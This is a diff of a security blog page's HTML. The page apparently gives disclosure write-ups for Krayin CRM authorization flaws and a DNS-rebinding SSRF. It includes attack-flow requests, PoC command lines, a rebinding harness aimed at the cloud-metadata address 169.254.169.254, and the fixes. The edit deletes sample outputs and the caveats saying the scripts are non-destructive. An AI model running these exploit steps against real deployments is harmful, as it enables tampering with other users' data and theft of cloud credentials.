@@ -13,12 +13,6 @@
   <title>A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots · 0xAdham</title>
   <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
   <link rel="stylesheet" href="/assets/site.css">
-<style>
-.poc-source { margin: 16px 0; border: 1px solid var(--line); background: var(--panel-2); }
-.poc-source summary { cursor: pointer; padding: 10px 12px; color: var(--accent, #ff3428); font-family: var(--mono); font-size: 13px; }
-.poc-source summary:hover { color: var(--ink); }
-.poc-source pre { margin: 0; border-top: 1px solid var(--line); max-height: 560px; overflow: auto; }
-</style>
 </head>
 <body>
   <header class="site-header">
@@ -201,7 +195,7 @@ with a low-privilege agent session against an authorized local test instance:</p
   --login-email agent@test.local --login-password agent123 \
   --lead-ids 1
 </code></pre>
-<details class="poc-source">
+<details>
 <summary>Show more — view the full <code>CVE-2026-112286.py</code> source</summary>
 <pre><code class="language-python">import argparse
 import datetime
@@ -406,7 +400,170 @@ if __name__ == &quot;__main__&quot;:
     main()
 </code></pre>
 </details>
-<details class="poc-source">
+<h3>Fix: remediation that shipped in 2.2.7</h3>
+<p>Two additions, both mirroring patterns already in the codebase:</p>
+<pre><code class="language-php">// leadProducts()
+$lead = $this-&gt;leadRepository-&gt;findOrFail($leadId);
+$this-&gt;preventUnauthorizedAccess($lead-&gt;user_id);  // add this
+
+// search(): constrain to the caller's scope before -&gt;all()
+if ($userIds = bouncer()-&gt;getAuthorizedUserIds()) {
+    $this-&gt;quoteRepository-&gt;whereIn('user_id', $userIds);
+}
+</code></pre>
+<p>CVE-2026-61460 fixed object-level authorization on the write path of this controller and<br />
+four siblings. This finding is the same bug class on the two read endpoints that fix never<br />
+reached, reported so the Quote-module fix could actually be completed.</p>
+<h3>Timeline</h3>
+<ul>
+<li><strong>2026-10-04:</strong> Found during a white-box review of the 2.2 branch</li>
+<li><strong>2026-10-05:</strong> Reported to the vendor with advisory + PoC</li>
+<li><strong>2026-10-09:</strong> Confirmed in a local lab</li>
+<li><strong>2026-10-19:</strong> CVE-2026-112286 published, fixed in 2.2.7</li>
+</ul>
+<h3>Takeaways</h3>
+<ul>
+<li><strong>Hunter:</strong> when a vendor patches an auth bug, check the <em>read</em> endpoints of the same controller; fixes track reports, not bug classes.</li>
+<li><strong>Dev:</strong> a collection endpoint needs the same scope filter as the DataGrid that lists it. <code>-&gt;all()</code> with only search criteria is a leak.</li>
+</ul>
+<hr />
+<h1>CVE-2026-112287</h1>
+<h2>Broken Object Level Authorization in the Mail module</h2>
+<p><code>HIGH · CVSS 8.3</code> · <code>CWE-639</code> · <code>BOLA</code></p>
+<h3>TL;DR</h3>
+<ul>
+<li><strong>The bug:</strong> the Mail module checks ownership when you <em>read</em> an email but not when you <em>modify or delete</em> one.</li>
+<li><strong>The impact:</strong> a low-privilege agent can trash, bulk-delete, edit and re-send other users' emails, and the edit response leaks the thread's contents too.</li>
+<li><strong>Status:</strong> reported 2026-10-05, fixed in 2.2.7, published as CVE-2026-112287.</li>
+</ul>
+<h3>At a glance</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Product</strong></td>
+<td>Krayin CRM (<code>krayin/laravel-crm</code>)</td>
+</tr>
+<tr>
+<td><strong>Component</strong></td>
+<td><code>Mail/EmailController.php</code></td>
+</tr>
+<tr>
+<td><strong>Class</strong></td>
+<td>BOLA on the write path · CWE-639</td>
+</tr>
+<tr>
+<td><strong>Severity</strong></td>
+<td>High, CVSS 3.1 <strong>8.3</strong> · <code>AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H</code></td>
+</tr>
+<tr>
+<td><strong>Affected / fixed</strong></td>
+<td><code>&lt; 2.2.7</code>, fixed in <code>2.2.7</code></td>
+</tr>
+</tbody>
+</table>
+<h3>Why this matters</h3>
+<p>Email threads in a CRM are the record of a customer relationship. This bug lets one sales<br />
+agent quietly <strong>destroy another agent's correspondence</strong>, individually or in bulk, and<br />
+tamper with records they're not even allowed to open. It can also flip a draft into the<br />
+outbox and send mail on someone else's thread. That's damage to data integrity and<br />
+availability, with a side of data leakage.</p>
+<h3>In plain English</h3>
+<p>Think of a room with two doors. The front door has a lock that checks your badge: try to<br />
+<em>read</em> the mail and it says "not yours, 401." The back door, the one for deleting and<br />
+editing, was never fitted with a lock at all. Same room, same mail; one door guards it and<br />
+the other waves you straight through.</p>
+<h3>Attack flow</h3>
+<p>As the restricted (individual-scope) agent, against an email owned by another user:</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Request</th>
+<th>Response</th>
+<th>What it proves</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>GET /admin/mail/inbox/1</code></td>
+<td><code>401 Unauthorized</code></td>
+<td>read is gated</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>DELETE /admin/mail/1</code> (<code>type=trash</code>)</td>
+<td><code>200 "deleted"</code></td>
+<td>write is <strong>not</strong> gated</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>GET /admin/mail/trash/1</code></td>
+<td><code>401 Unauthorized</code></td>
+<td>still can't view the email it just trashed</td>
+</tr>
+</tbody>
+</table>
+<p>That contradiction, the same ID returns <code>401</code> on read and <code>200</code> on delete, is the entire<br />
+vulnerability, provable in two requests.</p>
+<h3>Deep dive: root cause and affected endpoints</h3>
+<p>The read path resolves the record's owner and enforces scope. <code>view()</code>:</p>
+<pre><code class="language-php">if ($userIds = bouncer()-&gt;getAuthorizedUserIds()) {
+    $ownerIds = array_filter([$email-&gt;lead?-&gt;user_id, $email-&gt;person?-&gt;user_id]);
+    if ($ownerIds &amp;&amp; empty(array_intersect($ownerIds, $userIds))) {
+        abort(401, trans('admin::app.errors.unauthorized'));
+    }
+}
+</code></pre>
+<p>None of the four mutating actions do this. Three things make it exploitable rather than<br />
+theoretical: the guard is simply <strong>absent</strong> (not weakened); the route ACL is only<br />
+<em>feature</em>-level ("may this user use mail"), which every agent passes; and <code>update()</code> reads<br />
+<code>request('id') ?? $id</code>, so a body ID overrides the URL, making it a disclosure primitive<br />
+too.</p>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Missing guard</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PUT /admin/mail/edit/{id}</code></td>
+<td><code>preventUnauthorizedAccess</code></td>
+</tr>
+<tr>
+<td><code>DELETE /admin/mail/{id}</code></td>
+<td><code>preventUnauthorizedAccess</code></td>
+</tr>
+<tr>
+<td><code>POST /admin/mail/mass-update</code></td>
+<td><code>filterAuthorizedRecords</code></td>
+</tr>
+<tr>
+<td><code>POST /admin/mail/mass-destroy</code></td>
+<td><code>filterAuthorizedRecords</code></td>
+</tr>
+</tbody>
+</table>
+<p>Every sibling module (Person, Organization, Quote, Activity) routes its bulk operations<br />
+through <code>filterAuthorizedRecords()</code>. Mail is the one that skipped the ownership filter on the<br />
+delete and modify path.</p>
+<h3>PoC: trash, bulk-delete and the disclosure write</h3>
+<p>The repository PoC first confirms the out-of-scope read returns <code>401</code>, then runs one
+reversible <code>type=trash</code> write, demonstrates the disclosure through <code>update()</code>, and
+restores the email to the inbox:</p>
+<pre><code class="language-bash">python3 CVE-2026-112287.py --url http://127.0.0.1:8000 \
+  --login-email agent@test.local --login-password agent123 \
+  --email-id 1
+</code></pre>
+<details>
 <summary>Show more — view the full <code>CVE-2026-112287.py</code> source</summary>
 <pre><code class="language-python">import argparse
 import datetime
@@ -617,190 +774,6 @@ if __name__ == &quot;__main__&quot;:
     main()
 </code></pre>
 </details>
-<pre><code class="language-text">[+] authenticated on http://127.0.0.1:8000
-  B1 lead-products/1  -&gt; 200  VULNERABLE
-     leaked: {&quot;product_id&quot;: 1, &quot;name&quot;: &quot;Owner Secret Widget&quot;, &quot;quantity&quot;: 3, &quot;price&quot;: 1234.56, &quot;total&quot;: 3703.68}
-  B2 quotes/search        -&gt; 200  VULNERABLE  (1 quote(s))
-</code></pre>
-<p>Use <code>--cookie</code> instead of the login options when replaying a captured low-privilege
-session, and <code>--lead-ids 1-50</code> for a scoped exposure check. The repository PoC
-(<code>CVE-2026-112286.py</code>) is strictly read-only; its source and usage are in the
-<a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">GitHub PoC repository</a>.</p>
-<h3>Fix: remediation that shipped in 2.2.7</h3>
-<p>Two additions, both mirroring patterns already in the codebase:</p>
-<pre><code class="language-php">// leadProducts()
-$lead = $this-&gt;leadRepository-&gt;findOrFail($leadId);
-$this-&gt;preventUnauthorizedAccess($lead-&gt;user_id);  // add this
-
-// search(): constrain to the caller's scope before -&gt;all()
-if ($userIds = bouncer()-&gt;getAuthorizedUserIds()) {
-    $this-&gt;quoteRepository-&gt;whereIn('user_id', $userIds);
-}
-</code></pre>
-<p>CVE-2026-61460 fixed object-level authorization on the write path of this controller and<br />
-four siblings. This finding is the same bug class on the two read endpoints that fix never<br />
-reached, reported so the Quote-module fix could actually be completed.</p>
-<h3>Timeline</h3>
-<ul>
-<li><strong>2026-10-04:</strong> Found during a white-box review of the 2.2 branch</li>
-<li><strong>2026-10-05:</strong> Reported to the vendor with advisory + PoC</li>
-<li><strong>2026-10-09:</strong> Confirmed in a local lab</li>
-<li><strong>2026-10-19:</strong> CVE-2026-112286 published, fixed in 2.2.7</li>
-</ul>
-<h3>Takeaways</h3>
-<ul>
-<li><strong>Hunter:</strong> when a vendor patches an auth bug, check the <em>read</em> endpoints of the same controller; fixes track reports, not bug classes.</li>
-<li><strong>Dev:</strong> a collection endpoint needs the same scope filter as the DataGrid that lists it. <code>-&gt;all()</code> with only search criteria is a leak.</li>
-</ul>
-<hr />
-<h1>CVE-2026-112287</h1>
-<h2>Broken Object Level Authorization in the Mail module</h2>
-<p><code>HIGH · CVSS 8.3</code> · <code>CWE-639</code> · <code>BOLA</code></p>
-<h3>TL;DR</h3>
-<ul>
-<li><strong>The bug:</strong> the Mail module checks ownership when you <em>read</em> an email but not when you <em>modify or delete</em> one.</li>
-<li><strong>The impact:</strong> a low-privilege agent can trash, bulk-delete, edit and re-send other users' emails, and the edit response leaks the thread's contents too.</li>
-<li><strong>Status:</strong> reported 2026-10-05, fixed in 2.2.7, published as CVE-2026-112287.</li>
-</ul>
-<h3>At a glance</h3>
-<table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Product</strong></td>
-<td>Krayin CRM (<code>krayin/laravel-crm</code>)</td>
-</tr>
-<tr>
-<td><strong>Component</strong></td>
-<td><code>Mail/EmailController.php</code></td>
-</tr>
-<tr>
-<td><strong>Class</strong></td>
-<td>BOLA on the write path · CWE-639</td>
-</tr>
-<tr>
-<td><strong>Severity</strong></td>
-<td>High, CVSS 3.1 <strong>8.3</strong> · <code>AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H</code></td>
-</tr>
-<tr>
-<td><strong>Affected / fixed</strong></td>
-<td><code>&lt; 2.2.7</code>, fixed in <code>2.2.7</code></td>
-</tr>
-</tbody>
-</table>
-<h3>Why this matters</h3>
-<p>Email threads in a CRM are the record of a customer relationship. This bug lets one sales<br />
-agent quietly <strong>destroy another agent's correspondence</strong>, individually or in bulk, and<br />
-tamper with records they're not even allowed to open. It can also flip a draft into the<br />
-outbox and send mail on someone else's thread. That's damage to data integrity and<br />
-availability, with a side of data leakage.</p>
-<h3>In plain English</h3>
-<p>Think of a room with two doors. The front door has a lock that checks your badge: try to<br />
-<em>read</em> the mail and it says "not yours, 401." The back door, the one for deleting and<br />
-editing, was never fitted with a lock at all. Same room, same mail; one door guards it and<br />
-the other waves you straight through.</p>
-<h3>Attack flow</h3>
-<p>As the restricted (individual-scope) agent, against an email owned by another user:</p>
-<table>
-<thead>
-<tr>
-<th>Step</th>
-<th>Request</th>
-<th>Response</th>
-<th>What it proves</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td><code>GET /admin/mail/inbox/1</code></td>
-<td><code>401 Unauthorized</code></td>
-<td>read is gated</td>
-</tr>
-<tr>
-<td>2</td>
-<td><code>DELETE /admin/mail/1</code> (<code>type=trash</code>)</td>
-<td><code>200 "deleted"</code></td>
-<td>write is <strong>not</strong> gated</td>
-</tr>
-<tr>
-<td>3</td>
-<td><code>GET /admin/mail/trash/1</code></td>
-<td><code>401 Unauthorized</code></td>
-<td>still can't view the email it just trashed</td>
-</tr>
-</tbody>
-</table>
-<p>That contradiction, the same ID returns <code>401</code> on read and <code>200</code> on delete, is the entire<br />
-vulnerability, provable in two requests.</p>
-<h3>Deep dive: root cause and affected endpoints</h3>
-<p>The read path resolves the record's owner and enforces scope. <code>view()</code>:</p>
-<pre><code class="language-php">if ($userIds = bouncer()-&gt;getAuthorizedUserIds()) {
-    $ownerIds = array_filter([$email-&gt;lead?-&gt;user_id, $email-&gt;person?-&gt;user_id]);
-    if ($ownerIds &amp;&amp; empty(array_intersect($ownerIds, $userIds))) {
-        abort(401, trans('admin::app.errors.unauthorized'));
-    }
-}
-</code></pre>
-<p>None of the four mutating actions do this. Three things make it exploitable rather than<br />
-theoretical: the guard is simply <strong>absent</strong> (not weakened); the route ACL is only<br />
-<em>feature</em>-level ("may this user use mail"), which every agent passes; and <code>update()</code> reads<br />
-<code>request('id') ?? $id</code>, so a body ID overrides the URL, making it a disclosure primitive<br />
-too.</p>
-<table>
-<thead>
-<tr>
-<th>Route</th>
-<th>Missing guard</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>PUT /admin/mail/edit/{id}</code></td>
-<td><code>preventUnauthorizedAccess</code></td>
-</tr>
-<tr>
-<td><code>DELETE /admin/mail/{id}</code></td>
-<td><code>preventUnauthorizedAccess</code></td>
-</tr>
-<tr>
-<td><code>POST /admin/mail/mass-update</code></td>
-<td><code>filterAuthorizedRecords</code></td>
-</tr>
-<tr>
-<td><code>POST /admin/mail/mass-destroy</code></td>
-<td><code>filterAuthorizedRecords</code></td>
-</tr>
-</tbody>
-</table>
-<p>Every sibling module (Person, Organization, Quote, Activity) routes its bulk operations<br />
-through <code>filterAuthorizedRecords()</code>. Mail is the one that skipped the ownership filter on the<br />
-delete and modify path.</p>
-<h3>PoC: trash, bulk-delete and the disclosure write</h3>
-<p>The repository PoC first confirms the out-of-scope read returns <code>401</code>, then runs one
-reversible <code>type=trash</code> write, demonstrates the disclosure through <code>update()</code>, and
-restores the email to the inbox:</p>
-<pre><code class="language-bash">python3 CVE-2026-112287.py --url http://127.0.0.1:8000 \
-  --login-email agent@test.local --login-password agent123 \
-  --email-id 1
-</code></pre>
-<pre><code class="language-text">[+] authenticated on http://127.0.0.1:8000
-  A0 control read inbox/1 -&gt; 401  (gated — out-of-scope baseline, good)
-  A1 trash /1 (type=trash) -&gt; 200  VULNERABLE
-     smoking-gun read trash/1 -&gt; 401  (still 401 — mutated mail it cannot view)
-  A2 disclose edit/1 -&gt; 200  VULNERABLE  leaked={&quot;id&quot;: 1, &quot;subject&quot;: &quot;Owner private email&quot;, &quot;reply&quot;: &quot;secret body&quot;}
-  A3 restore edit/1 folders=inbox -&gt; 200  (reverted)
-</code></pre>
-<p>Use <code>--cookie</code> instead of the login options for a captured session. The script is
-non-destructive by default; <code>--no-restore</code> deliberately leaves the email in Trash and
-should not be used for routine validation. The repository PoC
-(<code>CVE-2026-112287.py</code>) never hard-deletes or issues bulk operations; see the
-<a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">GitHub PoC repository</a>.</p>
 <h3>Fix: remediation and why it's a distinct CVE</h3>
 <p>Apply the ownership gate the read path already uses to every mutating action:</p>
 <pre><code class="language-php">$email = $this-&gt;emailRepository-&gt;findOrFail($id);
@@ -936,12 +909,10 @@ secondary gap: <code>FILTER_FLAG_NO_RES_RANGE</code> doesn't reliably flag IPv4-
 reflected read: exfiltration needs an internal service that acts on the request alone, or an<br />
 oracle. That's why it's Low (3.1, <code>AC:H</code>, blind), not a straight critical metadata read.</p>
 <h3>PoC: loopback rebinding harness</h3>
-<p>The repository PoC provides a local self-test for the rebinding resolver, followed by an
-engagement mode that runs the authoritative DNS server and callback listener:</p>
-<pre><code class="language-bash"># prove the resolver returns public on query #1 and loopback on query #2
-python3 CVE-2026-112288.py --selftest
+<p>The repository PoC provides a local self-test for the rebinding resolver:</p>
+<pre><code class="language-bash">python3 CVE-2026-112288.py --selftest
 </code></pre>
-<details class="poc-source">
+<details>
 <summary>Show more — view the full <code>CVE-2026-112288.py</code> source</summary>
 <pre><code class="language-python">import argparse
 import datetime
@@ -1074,25 +1045,11 @@ if __name__ == &quot;__main__&quot;:
     main()
 </code></pre>
 </details>
-<pre><code class="language-text">[dns]  rebinding resolver on 127.0.0.1:5353  (#1 93.184.216.34 -&gt; #2+ 127.0.0.1, TTL 0) for rebind.test
-[selftest] querying 127.0.0.1:5353 twice for rebind.test
-[dns]  A query #1 -&gt; 93.184.216.34  (PUBLIC (passes guard))
-[selftest] answer #1: 93.184.216.34
-[dns]  A query #2 -&gt; 127.0.0.1  (REBIND -&gt; 127.0.0.1)
-[selftest] answer #2: 127.0.0.1
-[selftest] #1 public + #2 rebind =&gt; the resolver rebinds correctly.
-</code></pre>
-<p>For an authorized integration test, delegate a test domain to the resolver and run the
-callback listener on the target-reachable host:</p>
+<p>For an authorized integration test, run the repository harness with a delegated test domain:</p>
 <pre><code class="language-bash">sudo python3 CVE-2026-112288.py \
   --domain ssrf.example --public 203.0.113.10 --rebind 169.254.169.254 \
   --bind 0.0.0.0 --dns-port 53 --listen-port 80 --token r4nd0m
 </code></pre>
-<p>Register a Krayin webhook using the printed callback URL, trigger the workflow, and treat a
-callback-listener hit as proof that the server-side request reached the rebinding target. This
-is the repository's blind-SSRF harness: it does not read cloud-metadata credentials or act on
-internal services. See <code>CVE-2026-112288.py</code> in the
-<a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">GitHub PoC repository</a>.</p>
 <h3>Fix: pin the connection to the validated IP</h3>
 <p>The root cause is the second resolution, so pin the connection to the IP the guard<br />
 validated:</p>
